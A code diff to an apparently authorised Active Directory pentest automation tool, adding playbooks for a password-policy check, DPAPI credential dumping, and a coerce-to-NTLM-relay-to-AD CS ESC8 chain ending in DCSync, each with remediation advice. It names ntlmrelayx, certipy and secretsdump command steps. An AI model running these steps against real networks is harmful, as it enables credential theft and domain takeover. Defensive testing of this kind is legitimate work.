@@ -32,7 +32,7 @@ from pathlib import Path
 
 
 # Bump when the built-in playbooks change so existing installs re-seed them.
-_BUILTIN_VERSION = 11
+_BUILTIN_VERSION = 12
 
 # Controlled vocabulary the step builder offers (free text is still allowed).
 # `domain`/`signing`/`host_info` are the reconnaissance variables an early
@@ -42,7 +42,7 @@ ARTIFACTS = [
     "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
     "adcs_vuln", "certificate", "mssql_exec", "delegation", "trust", "acl_write",
     "gpp", "zerologon_vuln", "nopac_vuln", "printnightmare_vuln", "ms17_vuln",
-    "admin", "flag",
+    "weak_policy", "dpapi_secret", "admin", "flag",
 ]
 # Execution triggers the sequence runner understands (see sequence._trigger_ok).
 # A step fires when its trigger is true against the current variables.
@@ -699,6 +699,93 @@ DEFAULT_PLAYBOOKS = [
         ],
     },
 
+    {
+        "id": "password-policy",
+        "name": "Weak domain password policy",
+        "summary": "Read the domain password policy; flag a weak one (no complexity, short "
+                   "minimum length, or no lockout) — the reason spraying and guessing work.",
+        "match": {"any_ports": [445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Read the account/password policy", "have credential", "netexec_smb",
+                  ["credential"], ["weak_policy"],
+                  "netexec_smb --pass-pol: minimum length, complexity flags, and lockout "
+                  "threshold.", args={"enumerate": "pass-pol"},
+                  severity="Medium", cvss="5.3",
+                  finding_title="Weak Domain Password Policy",
+                  impact="A weak password policy (complexity disabled, short minimum length, "
+                         "or no account lockout) makes password guessing and spraying "
+                         "effective and lets users pick trivially weak passwords.",
+                  recommendation="Enforce 14+ character minimum, enable complexity, set a "
+                         "lockout threshold, and deploy a banned-password list / FGPP for "
+                         "privileged accounts."),
+        ],
+    },
+    {
+        "id": "dpapi-loot",
+        "name": "DPAPI secret extraction (post-admin)",
+        "summary": "With local-admin access, dump DPAPI-protected secrets — saved browser "
+                   "and Windows credentials, Wi-Fi keys, and scheduled-task passwords.",
+        "match": {"any_ports": [445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Dump DPAPI secrets", "have credential", "netexec_module",
+                  ["credential"], ["dpapi_secret", "credential"],
+                  "netexec smb -M dpapi_hash (needs local admin): decrypt masterkeys and "
+                  "recover stored credentials from DPAPI.",
+                  "final", args={"protocol": "smb", "module": "dpapi_hash"},
+                  severity="High", cvss="7.5",
+                  finding_title="Credentials Recoverable via DPAPI",
+                  impact="A local administrator can decrypt DPAPI-protected secrets (browser "
+                         "and Windows saved credentials, Wi-Fi keys, task passwords), often "
+                         "yielding reusable credentials for lateral movement.",
+                  recommendation="Limit local-admin exposure, use credential-guard, avoid "
+                         "storing reusable secrets in browsers/tasks, and rotate on compromise."),
+        ],
+    },
+    {
+        "id": "relay-adcs-esc8",
+        "name": "Coerce → NTLM relay → AD CS ESC8 → Domain Admin",
+        "summary": "The classic no-fix chain: coerce a DC to authenticate, relay that NTLM "
+                   "to the AD CS web-enrollment endpoint (ESC8), obtain a certificate for "
+                   "the DC machine account, and use it to DCSync the domain.",
+        "match": {"any_ports": [445, 88], "signals": []},
+        "run": {},
+        "steps": [
+            _step(1, "Confirm the host is coercible", "start", "netexec_module",
+                  [], ["coerced"],
+                  "nxc smb -M coerce_plus: verify MS-RPRN/MS-EFSR/MS-DFSNM coercion is "
+                  "available (the trigger for the relay).",
+                  args={"protocol": "smb", "module": "coerce_plus"},
+                  severity="High", cvss="8.1",
+                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
+                  impact="A DC/host can be coerced to authenticate to an arbitrary target, "
+                         "feeding an NTLM relay to AD CS ESC8 for domain compromise.",
+                  recommendation="Patch coercion vectors, disable the Print Spooler on DCs, "
+                         "enforce EPA/HTTPS on AD CS, and disable NTLM."),
+            _step(2, "Find AD CS web enrollment (ESC8)", "have credential", "certipy_find",
+                  ["credential", "domain"], ["adcs_vuln"],
+                  "certipy find -vulnerable: ESC8 = the CA's HTTP web-enrollment endpoint "
+                  "accepts relayed NTLM. (Needs DNS pointed at a DC.)",
+                  severity="High", cvss="8.1",
+                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
+                  impact="An HTTP web-enrollment endpoint (ESC8) lets relayed NTLM enrol a "
+                         "certificate as a privileged account — full domain compromise.",
+                  recommendation="Require HTTPS + Extended Protection for Authentication on "
+                         "the CA web enrollment, or disable it."),
+            _step(3, "Relay coerced auth to the CA (ntlmrelayx --adcs)", "have credential",
+                  "ntlmrelayx (listener: -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController)",
+                  ["coerced", "adcs_vuln"], ["certificate"],
+                  "Start ntlmrelayx --adcs first, then step 1 coerces the DC into it; it "
+                  "relays the DC's NTLM to web enrollment and receives a base64 certificate."),
+            _step(4, "Authenticate with the DC certificate → DCSync", "have credential",
+                  "certipy_auth (use the relayed DC cert) → secretsdump -k", ["certificate"],
+                  ["hash", "admin", "flag"],
+                  "certipy auth -pfx dc.pfx → the DC's NT hash + TGT; then secretsdump -k / "
+                  "DCSync for the whole domain. This is the ESC8 → Domain Admin finish.",
+                  "final"),
+        ],
+    },
     {
         "id": "ad-cve-check",
         "name": "Critical AD CVE checks (ZeroLogon / noPac / PrintNightmare / …)",
